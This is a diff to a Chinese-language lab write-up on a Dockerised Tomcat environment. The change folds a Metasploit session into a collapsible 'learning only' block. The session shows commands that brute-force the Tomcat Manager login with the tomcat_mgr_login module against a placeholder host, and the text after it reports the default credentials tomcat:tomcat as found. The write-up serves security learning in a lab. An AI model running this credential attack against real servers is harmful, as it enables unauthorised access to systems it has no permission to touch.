@@ -81,25 +81,28 @@ docker-compose up -d
 
 在kali中使用metasploit对tomcat用户名和密码进行爆破：
 
-```
-┌──(root kali)-[/home/kali]
-└─# msfconsole
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">┌──(root kali)-[/home/kali]
+└─# &#109;sfconsole
 
 # 搜索tomcat相关模块
-msf6 > search tomcat
+msf6 &gt; search tomcat
 ...
    23  auxiliary/scanner/http/tomcat_mgr_login	normal     No     Tomcat Application Manager Login Utility
 ...
 
 # 使用tomcat_mgr_login模块进行爆破
-msf6 > use auxiliary/scanner/http/tomcat_mgr_login
+msf6 &gt; use auxiliary/scanner/http/tomcat_mgr_login
 
 # 设置服务地址
-msf6 auxiliary(scanner/http/tomcat_mgr_login) >show options
-msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS <your-ip>
-RHOSTS => <your-ip>
-msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
-```
+msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt;show options
+msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set RHOSTS &lt;your-ip&gt;
+RHOSTS =&gt; &lt;your-ip&gt;
+msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; run</code></pre>
+
+</details>
 
 爆破成功，用户名密码为`tomcat:tomcat`：
 
